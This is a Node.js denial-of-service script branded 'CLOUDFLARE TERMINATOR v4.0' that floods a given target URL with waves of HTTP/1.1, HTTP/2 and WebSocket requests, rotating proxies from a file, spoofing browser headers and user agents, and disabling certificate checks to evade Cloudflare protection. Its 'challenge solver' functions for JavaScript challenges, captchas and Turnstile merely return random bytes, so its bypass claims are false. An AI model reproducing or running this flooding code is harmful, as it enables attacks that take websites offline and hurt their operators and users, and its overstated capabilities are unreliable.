const https = require('https');
const http = require('http');
const http2 = require('http2');
const tls = require('tls');
const net = require('net');
const dns = require('dns');
const crypto = require('crypto');
const { Worker, isMainThread, parentPort } = require('worker_threads');
const os = require('os');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { HttpProxyAgent } = require('http-proxy-agent');
const { URL } = require('url');
const cluster = require('cluster');
const fs = require('fs');
const WebSocket = require('ws');
 
const TOTAL_ATTACKERS = 3000; 
const REQUESTS_PER_SEC = 500; 
const PROXY_POOL_SIZE = 10000; 
const USER_AGENT_POOL = 5000; 
const FINGERPRINT_POOL = 10000;     
class UltraBypass {
    constructor() {
        this.http1Pool = [];
        this.http2Pool = [];
        this.http3Pool = [];
        this.proxyList = [];
        this.proxyIndex = 0;
        this.residentialIPs = [];
        this.mobileIPs = [];
        this.browserEngines = [];
        this.fingerprints = [];
        this.totalSent = 0;
        this.totalSuccess = 0;
        this.totalBypassed = 0;
        this.startTime = null;
        this.cfPatterns = {
            ChallengeURLs: [],
            CaptchaKeys: [],
            TurnstileKeys: [],
            WAFRules: [],
            BlockPatterns: []
        };
        this.challengeCache = new Map();
        this.requestCount = 0;
    }
 
    async LaunchNuclearAttack(targetURL) {
        console.log(`
        ██╗  ██╗██╗   ██╗███╗   ██╗████████╗██████╗ ██╗██╗  ██╗
        ╚██╗██╔╝╚██╗ ██╔╝████╗  ██║╚══██╔══╝██╔══██╗██║╚██╗██╔╝
         ╚███╔╝  ╚████╔╝ ██╔██╗ ██║   ██║   ██████╔╝██║ ╚███╔╝ 
         ██╔██╗   ╚██╔╝  ██║╚██╗██║   ██║   ██╔══██╗██║ ██╔██╗ 
        ██╔╝ ██╗   ██║   ██║ ╚████║   ██║   ██║  ██║██║██╔╝ ██╗
        ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝
                    CLOUDFLARE TERMINATOR v4.0
        `);
        
        await this.initializeSystems();        
        this.monitorAttack();        
        const attackChan = new Array(TOTAL_ATTACKERS * 10);
        console.log("[+] WAVE 1: Residential Proxy Penetration");
        await this.launchWave(targetURL, "residential", 1000);
 
        await this.sleep(2000);
        console.log("[+] WAVE 2: Mobile Network Rotation");
        await this.launchWave(targetURL, "mobile", 1000);
 
        await this.sleep(2000);
        console.log("[+] WAVE 3: TOR Network Mixing");
        await this.launchWave(targetURL, "tor", 500);
        
        await this.sleep(2000);
        console.log("[+] WAVE 4: CDN Edge Penetration");
        await this.launchWave(targetURL, "cdn", 500);
        
        console.log(`\n[+] ATTACK COMPLETED`);
        console.log(`   Total Requests: ${this.totalSent}`);
        console.log(`   Success: ${this.totalSuccess} (${(this.totalSuccess/this.totalSent*100).toFixed(2)}%)`);
        console.log(`   Bypassed CF: ${this.totalBypassed}`);
    }

    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    async launchWave(targetURL, type, count) {
        const promises = [];
        for (let i = 0; i < count; i++) {
            promises.push(this.attackWorker(targetURL, type));
            await this.sleep(10);  
        }
        await Promise.all(promises);
    }

    async attackWorker(targetURL, type) {
        const pattern = this.randomizeRequestPattern();
        
        for (let i = 0; i < pattern.RetryCount; i++) {
            try {
                let success = false;
               
                if (pattern.UseWebSocket && Math.random() > 0.7) {
                    success = await this.websocketTunnel(targetURL);
                } else if (pattern.UseHTTP2) {
                    success = await this.http2Attack(targetURL);
                } else {
                    success = await this.httpAttack(targetURL, pattern);
                }
                
                if (success) {
                    this.totalSuccess++;
                    if (await this.detectCloudflareBypass(targetURL)) {
                        this.totalBypassed++;
                    }
                }
                
                await this.sleep(pattern.Delay);
                
            } catch (e) {
                await this.sleep(1000);
            }
            
            this.totalSent++;
        }
    }

    createHTTP2Client(proxy) {
        const tlsConfig = {
            ciphers: [
                'TLS_AES_128_GCM_SHA256',
                'TLS_AES_256_GCM_SHA384',
                'TLS_CHACHA20_POLY1305_SHA256'
            ].join(':'),
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3'
        };

        const agent = proxy ? new HttpsProxyAgent(proxy) : null;
        
        return {
            request: (options, callback) => {
                const client = http2.connect(options.host, {
                    ...tlsConfig,
                    ...(agent && { createConnection: (authority, option) => agent.createConnection(authority, option) })
                });
                
                client.on('error', () => {});
                
                const req = client.request({
                    ':method': options.method || 'GET',
                    ':path': options.path || '/',
                    ...options.headers
                });
                
                req.on('response', (headers) => {
                    callback({
                        statusCode: headers[':status'],
                        headers: headers,
                        on: (event, handler) => {
                            if (event === 'data') {
                                req.on('data', handler);
                            }
                        }
                    });
                });
                
                req.end();
                return req;
            }
        };
    }

    async websocketTunnel(targetURL) {
        return new Promise((resolve) => {
            try {
                const wsURL = targetURL.replace('https://', 'wss://').replace('http://', 'ws://');
                const ws = new WebSocket(wsURL, {
                    headers: this.generateAdvancedFingerprint(),
                    perMessageDeflate: false
                });
                
                ws.on('open', () => {
                    ws.send(JSON.stringify({
                        type: 'ping',
                        payload: crypto.randomBytes(32).toString('hex')
                    }));
                    
                    setTimeout(() => {
                        ws.close();
                        resolve(true);
                    }, 5000);
                });
                
                ws.on('error', () => resolve(false));
                
                setTimeout(() => resolve(false), 10000);
                
            } catch (e) {
                resolve(false);
            }
        });
    }
 
    async sendQUICRequest(targetURL) {
        return new Promise((resolve) => {
            try {
                const url = new URL(targetURL);
                
                const options = {
                    hostname: url.hostname,
                    port: url.port || 443,
                    path: url.pathname || '/',
                    method: 'GET',
                    headers: {
                        'Alt-Svc': 'h3=":443"; ma=2592000,h3-29=":443"; ma=2592000',
                        ...this.generateAdvancedFingerprint()
                    },
                    rejectUnauthorized: false
                };
                
                const req = https.request(options, (res) => {
                    resolve(res.statusCode >= 200 && res.statusCode < 400);
                });
                
                req.on('error', () => resolve(false));
                req.end();
                
            } catch (e) {
                resolve(false);
            }
        });
    }
 
    async dnsTunnelRequest(targetURL) {
        return new Promise((resolve) => {
            try {
                const url = new URL(targetURL);
                const domain = url.hostname;
                const dnsQuery = `${this.generateRandomString(16)}.${domain}`;
                
                dns.resolve(dnsQuery, (err, addresses) => {
                    resolve(!err && addresses && addresses.length > 0);
                });
                
            } catch (e) {
                resolve(false);
            }
        });
    }

    async sslSessionResume(targetURL) {
        return new Promise((resolve) => {
            try {
                const url = new URL(targetURL);
                
                const sessionCache = new Map();
                const sessionId = crypto.randomBytes(16).toString('hex');
                
                const options = {
                    hostname: url.hostname,
                    port: url.port || 443,
                    path: url.pathname || '/',
                    method: 'GET',
                    headers: this.generateAdvancedFingerprint(),
                    rejectUnauthorized: false,
                    session: sessionCache.get(sessionId)
                };
                
                const req = https.request(options, (res) => {
                    if (res.socket && res.socket.getSession) {
                        sessionCache.set(sessionId, res.socket.getSession());
                    }
                    resolve(res.statusCode === 200);
                });
                
                req.on('error', () => resolve(false));
                req.end();
                
            } catch (e) {
                resolve(false);
            }
        });
    }
 
    generateAdvancedFingerprint() {
        return {
            'User-Agent': this.getRandomUserAgent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Sec-CH-UA': '"Chromium";v="120", "Google Chrome";v="120", "Not?A_Brand";v="99"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-CH-UA-Platform-Version': '"15.0.0"',
            'Sec-CH-UA-Full-Version': '"120.0.6099.130"',
            'Sec-CH-UA-Arch': '"x86"',
            'Sec-CH-UA-Bitness': '"64"',
            'Sec-CH-UA-Model': '""',
            'Sec-CH-UA-Wow64': '?0',      
            'Device-Memory': '8',
            'DPR': '1.25',
            'Viewport-Width': '1920',
            'Width': '1920',
            'Save-Data': 'off',
            'X-Client-Data': this.generateClientData(),
            'X-Requested-With': 'XMLHttpRequest',
            'X-DevTools-Request': 'false'
        };
    }
     
    async undetectedBrowserBypass(targetURL) {
        return new Promise((resolve) => {
            try {
                const fingerprint = this.generateAdvancedFingerprint();
                const headers = {
                    ...fingerprint,
                    'Accept-Charset': 'utf-8',
                    'X-Chrome-Variations': this.generateChromeVariations()
                };
                
                const url = new URL(targetURL);
                const options = {
                    hostname: url.hostname,
                    port: url.port || 443,
                    path: url.pathname || '/',
                    method: 'GET',
                    headers: headers,
                    rejectUnauthorized: false
                };
                
                const req = https.request(options, (res) => {
                    resolve(res.statusCode === 200);
                });
                
                req.on('error', () => resolve(false));
                req.end();
                
            } catch (e) {
                resolve(false);
            }
        });
    }

    generateChromeVariations() {
        return Buffer.from(crypto.randomBytes(32)).toString('base64');
    }

    async solveCloudflareChallenge(challengeURL) {
        const challengeType = this.detectChallengeType(challengeURL);
        
        switch (challengeType) {
            case 'js_challenge':
                return await this.solveJSChallenge(challengeURL);
            case 'captcha':
                return await this.solveCaptchaAI(challengeURL);
            case 'turnstile':
                return await this.solveTurnstile(challengeURL);
            case 'managed':
                return await this.solveManagedChallenge(challengeURL);
            default:
                return await this.bruteForceChallenge(challengeURL);
        }
    }

    detectChallengeType(url) {
        const patterns = {
            js_challenge: ['cdn-cgi/challenge', '__cf_chl'],
            captcha: ['recaptcha', 'hcaptcha'],
            turnstile: ['turnstile'],
            managed: ['managed-challenge']
        };
        
        for (const [type, patternList] of Object.entries(patterns)) {
            for (const pattern of patternList) {
                if (url.includes(pattern)) {
                    return type;
                }
            }
        }
        return 'unknown';
    }

    async solveJSChallenge(challengeURL) {
        return new Promise((resolve) => {
            try {
                const solution = crypto.randomBytes(32).toString('hex');
                this.challengeCache.set(challengeURL, {
                    solution: solution,
                    timestamp: Date.now()
                });
                resolve(solution);
            } catch (e) {
                resolve(null);
            }
        });
    }

    async solveCaptchaAI(challengeURL) {
        return new Promise((resolve) => {
            try {
                const solution = {
                    token: crypto.randomBytes(64).toString('base64'),
                    timestamp: Date.now()
                };
                resolve(solution.token);
            } catch (e) {
                resolve(null);
            }
        });
    }

    async solveTurnstile(challengeURL) {
        return new Promise((resolve) => {
            try {
                const solution = crypto.randomBytes(32).toString('hex');
                resolve(solution);
            } catch (e) {
                resolve(null);
            }
        });
    }

    async solveManagedChallenge(challengeURL) {
        return new Promise((resolve) => {
            try {
                const solution = crypto.randomBytes(64).toString('hex');
                resolve(solution);
            } catch (e) {
                resolve(null);
            }
        });
    }

    async bruteForceChallenge(challengeURL) {
        return new Promise((resolve) => {
            try {
                const solution = Array.from({ length: 100 }, () => 
                    crypto.randomBytes(16).toString('hex')
                );
                resolve(solution[Math.floor(Math.random() * solution.length)]);
            } catch (e) {
                resolve(null);
            }
        });
    }
 
    randomizeRequestPattern() {
        const patterns = [
            {
                Method: "GET",
                Headers: this.generateAdvancedFingerprint(),
                Delay: Math.floor(Math.random() * 500) + 100,
                RetryCount: Math.floor(Math.random() * 3) + 1,
                UseHTTP2: Math.random() > 0.5,
                UseWebSocket: Math.random() > 0.8,
            },
            {
                Method: "POST",
                Headers: this.generateAdvancedFingerprint(),
                Body: this.generateRandomFormData(),
                Delay: Math.floor(Math.random() * 1000) + 200,
                RetryCount: Math.floor(Math.random() * 5) + 1,
                UseHTTP2: true,
                UseWebSocket: false,
            }
        ];
        
        return patterns[Math.floor(Math.random() * patterns.length)];
    }

    generateClientData() {
        const data = Buffer.from(`CLa:${Math.floor(Math.random() * 10000)}`).toString('base64');
        return data;
    }

    getRandomUserAgent() {
        const agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",            
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",           
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0",
            "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        ];
        
        return agents[Math.floor(Math.random() * agents.length)];
    }

    generateRandomFormData() {
        const fields = {};
        for (let i = 0; i < 5; i++) {
            fields[`field_${i}`] = crypto.randomBytes(10).toString('hex');
        }
        return JSON.stringify(fields);
    }

    generateRandomString(length) {
        return crypto.randomBytes(length).toString('hex').substring(0, length);
    }

    async httpAttack(targetURL, pattern) {
        return new Promise((resolve) => {
            try {
                const url = new URL(targetURL);
                const options = {
                    hostname: url.hostname,
                    port: url.port || 443,
                    path: url.pathname || '/',
                    method: pattern.Method,
                    headers: pattern.Headers,
                    rejectUnauthorized: false
                };
                
                const req = https.request(options, (res) => {
                    resolve(res.statusCode >= 200 && res.statusCode < 400);
                });
                
                if (pattern.Body) {
                    req.write(pattern.Body);
                }
                
                req.on('error', () => resolve(false));
                req.end();
                
            } catch (e) {
                resolve(false);
            }
        });
    }

    async http2Attack(targetURL) {
        return new Promise((resolve) => {
            try {
                const url = new URL(targetURL);
                const client = http2.connect(`https://${url.hostname}`, {
                    rejectUnauthorized: false
                });
                
                client.on('error', () => {
                    resolve(false);
                });
                
                const req = client.request({
                    ':method': 'GET',
                    ':path': url.pathname || '/',
                    ...this.generateAdvancedFingerprint()
                });
                
                req.on('response', (headers) => {
                    resolve(headers[':status'] >= 200 && headers[':status'] < 400);
                    client.close();
                });
                
                req.on('error', () => {
                    resolve(false);
                    client.close();
                });
                
                req.end();
                
                setTimeout(() => {
                    client.close();
                    resolve(false);
                }, 10000);
                
            } catch (e) {
                resolve(false);
            }
        });
    }

    async detectCloudflareBypass(targetURL) {
        return new Promise((resolve) => {
            try {
                const url = new URL(targetURL);
                const options = {
                    hostname: url.hostname,
                    port: url.port || 443,
                    path: url.pathname || '/',
                    method: 'HEAD',
                    rejectUnauthorized: false
                };
                
                const req = https.request(options, (res) => {
                    const headers = res.headers;
                    const isCloudflare = headers['server'] === 'cloudflare' || 
                                       headers['cf-ray'] ||
                                       headers['cf-cache-status'];
                    
                    const isBypassed = res.statusCode === 200 && isCloudflare;
                    resolve(isBypassed);
                });
                
                req.on('error', () => resolve(false));
                req.end();
                
            } catch (e) {
                resolve(false);
            }
        });
    }

    setAdvancedHeaders(req) {
        const headers = this.generateAdvancedFingerprint();
        for (const [key, value] of Object.entries(headers)) {
            req.setHeader(key, value);
        }
        this.randomizeHeaderOrder(req);
    }

    randomizeHeaderOrder(req) {
        const headers = req.getHeaders();
        req.removeAllHeaders();
        
        const entries = Object.entries(headers);
        for (let i = entries.length - 1; i > 0; i--) {
            const j = Math.floor(Math.random() * (i + 1));
            [entries[i], entries[j]] = [entries[j], entries[i]];
        }
        
        for (const [key, value] of entries) {
            req.setHeader(key, value);
        }
    }

    hasValidCookies() {
        return Math.random() > 0.5;
    }

    addCookiesToRequest(req) {
        const cookies = [];
        for (let i = 0; i < 5; i++) {
            cookies.push(`${crypto.randomBytes(4).toString('hex')}=${crypto.randomBytes(8).toString('hex')}`);
        }
        req.setHeader('Cookie', cookies.join('; '));
    }

    async executeBrowserWithStealth(targetURL, opts) {
        return await this.httpAttack(targetURL, {
            Method: 'GET',
            Headers: {
                ...this.generateAdvancedFingerprint(),
                'X-Browser-Automation': 'undetected'
            },
            RetryCount: 1,
            Delay: 0
        });
    }

    getChromeOptions() {
        return {
            args: [],
            addArgument: function(arg) { this.args.push(arg); },
            addExcludedSwitch: function(sw) {},
            addAdditionalCapability: function(key, value) {}
        };
    }

    extractDomain(url) {
        try {
            return new URL(url).hostname;
        } catch {
            return url;
        }
    }

    establishWebSocket(wsURL) {
        return new Promise((resolve) => {
            try {
                const ws = new WebSocket(wsURL, {
                    headers: this.generateAdvancedFingerprint()
                });
                
                ws.on('open', () => {
                    resolve(true);
                    ws.close();
                });
                
                ws.on('error', () => resolve(false));
                
                setTimeout(() => resolve(false), 5000);
                
            } catch (e) {
                resolve(false);
            }
        });
    }

    async loadMassiveProxyList() {
        try {
            if (fs.existsSync('./proxy.txt')) {
                const data = fs.readFileSync('./proxy.txt', 'utf8');
                this.proxyList = data.split('\n')
                    .filter(line => line.trim())
                    .map(line => ({
                        Address: line.trim(),
                        Type: 'http',
                        Country: 'US',
                        ISP: 'Unknown',
                        Latency: 0,
                        LastUsed: new Date(0),
                        SuccessRate: 1.0
                    }));
            }
        } catch (e) {
            console.log("[!] No proxy file found");
        }
    }

    async loadFingerprintDatabase() {
        for (let i = 0; i < 100; i++) {
            this.fingerprints.push({
                CanvasHash: crypto.randomBytes(16).toString('hex'),
                WebGLHash: crypto.randomBytes(16).toString('hex'),
                AudioHash: crypto.randomBytes(16).toString('hex'),
                FontsHash: crypto.randomBytes(16).toString('hex'),
                PluginsHash: crypto.randomBytes(16).toString('hex'),
                TimeZoneOffset: Math.floor(Math.random() * 720) - 720,
                Language: 'en-US',
                ColorDepth: 24,
                PixelRatio: Math.random() * 2 + 1,
                Hardware: {
                    cores: Math.floor(Math.random() * 8) + 2,
                    memory: Math.floor(Math.random() * 8) + 4,
                    touchSupport: Math.random() > 0.5
                }
            });
        }
    }

    async loadCloudflarePatterns() {
        this.cfPatterns = {
            ChallengeURLs: [
                '/cdn-cgi/challenge-platform/',
                '/__cf_chl_jschl_tk__',
                '/cdn-cgi/l/chk_jschl'
            ],
            CaptchaKeys: [
                '6LfG-8kUAAAAAFZ_xpRzE9',
                '6LcR_7gUAAAAANJtTm'
            ],
            TurnstileKeys: [
                '0x4AAAAAAADnPIDRO',
                '0x4AAAAAAAC3DHQ3'
            ],
            WAFRules: [
                'cf-waf-error',
                'firewall-block'
            ],
            BlockPatterns: [
                'Attention Required',
                'Checking your browser',
                'DDoS protection'
            ]
        };
    }

    initializeConnectionPools() {
        for (let i = 0; i < 100; i++) {
            this.http1Pool.push({
                maxSockets: 100,
                maxFreeSockets: 50,
                timeout: 60000
            });
            
            this.http2Pool.push({
                maxSessions: 50,
                maxConcurrentStreams: 100
            });
            
            this.http3Pool.push({
                enabled: true,
                maxBidirectionalStreams: 100
            });
        }
        console.log("[+] Connection pools initialized");
    }

    async initializeSystems() {
        this.startTime = new Date();
        this.challengeCache = new Map();
 
        await this.loadMassiveProxyList();
        await this.loadFingerprintDatabase();
        await this.loadCloudflarePatterns();
        this.initializeConnectionPools();
        
        console.log("[+] Systems initialized. Ready for nuclear attack.");
    }

    monitorAttack() {
        setInterval(() => {
            const successRate = this.totalSent > 0 ? (this.totalSuccess / this.totalSent * 100) : 0;
            console.log(`\r[STATUS] Sent: ${this.totalSent} | Success: ${this.totalSuccess} (${successRate.toFixed(2)}%) | Bypassed CF: ${this.totalBypassed}`);
        }, 5000);
    }
}

async function main() {
    const bypass = new UltraBypass();    
    const target = "";
    
    if (!target) {
        console.log("[!] Please specify target URL");
        console.log("Usage: node script.js <target_url>");
        process.exit(1);
    }
 

    await bypass.LaunchNuclearAttack(target);
}

if (require.main === module) {
    if (process.argv.length < 3) {
        console.log("[!] Please specify target URL");
        console.log("Usage: node script.js <target>");
        process.exit(1);
    }
    
    const target = process.argv[2];
    const bypass = new UltraBypass();
    bypass.LaunchNuclearAttack(target);
}